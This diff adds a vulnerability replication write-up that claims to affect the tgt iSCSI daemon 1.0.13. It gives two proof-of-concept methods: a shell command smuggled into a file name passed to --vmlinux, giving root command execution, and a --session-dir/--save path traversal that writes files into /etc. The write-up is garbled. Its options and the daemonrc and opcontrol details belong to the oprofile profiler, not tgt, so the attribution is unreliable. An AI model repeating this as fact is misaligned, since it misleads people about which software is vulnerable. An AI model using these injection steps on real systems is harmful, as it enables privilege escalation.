@@ -3,4 +3,66 @@ STEPS FOR REPLICATION
 1. Download package from github (version 1.0.13) 
 	Link: https://github.com/fujita/tgt/releases/tag/v1.0.13
 2. Untar and install
-3. 
+
+
+################# Method 1 ##################
+
+The problem is in the functions iscsi_rx_handler function (usr/iscsi/iscsid.c) where multiple values 
+are saved in the shell script /root/.oprofile/daemonrc.
+
+That file is sourced in iscsi_rx_handler by later invocations of opcontrol.
+
+The function iscsi_rx_handler() does not sanitize the values and thus 
+allows iscsi_rx_handler() to execute arbitrary commands.
+
+Here is a possible method using the --vmlinux option:
+
+(1) create a fake vmlinux file with a 'malformed' name
+
+#  touch "$HOME/abcd;id"
+
+(2) start the oprofile daemon using that vmlinux file. This creates the 
+daemonrc file
+
+# sudo tgtd   --vmlinux="$HOME/aaaa;id"
+
+(3) Any invocation of tgtd will now source the malformed daemonrc 
+file as root.
+
+# sudo tgtd   --stop
+uid=0(root) gid=0(root) groups=0(root)
+Daemon not running
+
+(4) The daemonrc file can be cleared with
+
+# sudo tgtd   --no-vmlinux
+
+The same trick can probably be used with the --session-dir and --xen 
+options.
+
+################# Method 2 ##################
+
+The --save=name option is moving samples/current to samples/name in the 
+current session directory.
+
+A proper combination of  --session-dir and --save can be used to copy a 
+file to any location.
+
+The following example shows how to create a file /etc/XXX
+
+(1) Create a 'samples' directory
+
+# mkdir -p /tmp/xxx/samples
+
+(2) Create a file named 'current' in that directory
+
+# echo "my_commands" > /tmp/xxx/samples/current
+
+(3) Set the oprofile session directory to the root of the 'samples' 
+directory
+
+# sudo tgtd --session-dir=/tmp/xxx
+
+(4)  Execute --save with a path relative to the 'current' file
+
+#  sudo tgtd --save=../../../etc/XXX
